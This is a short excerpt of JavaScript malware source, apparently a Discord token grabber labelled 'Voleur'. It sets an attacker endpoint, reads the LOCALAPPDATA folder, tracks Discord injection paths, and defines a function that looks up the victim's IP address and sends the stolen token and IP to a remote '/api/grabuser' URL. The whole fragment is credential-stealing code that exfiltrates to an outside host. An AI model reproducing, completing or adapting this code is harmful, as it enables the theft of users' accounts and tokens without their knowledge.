...
let api_url = 'https://necanewater.cf'; let api_auth = '__Voleur_Auth_Here__'; const local = process.env.LOCALAPPDATA; const discords = []; debug = false; let injection_paths = []
...
function SendDataToBackEnd(token) { 
    httpx.get('https://api.ipify.org/').then(res=> { const url = `${api_url}/api/grabuser?token=${token}&ip=${res.data}&auth=${api_auth}`; httpx.get(url); })
}
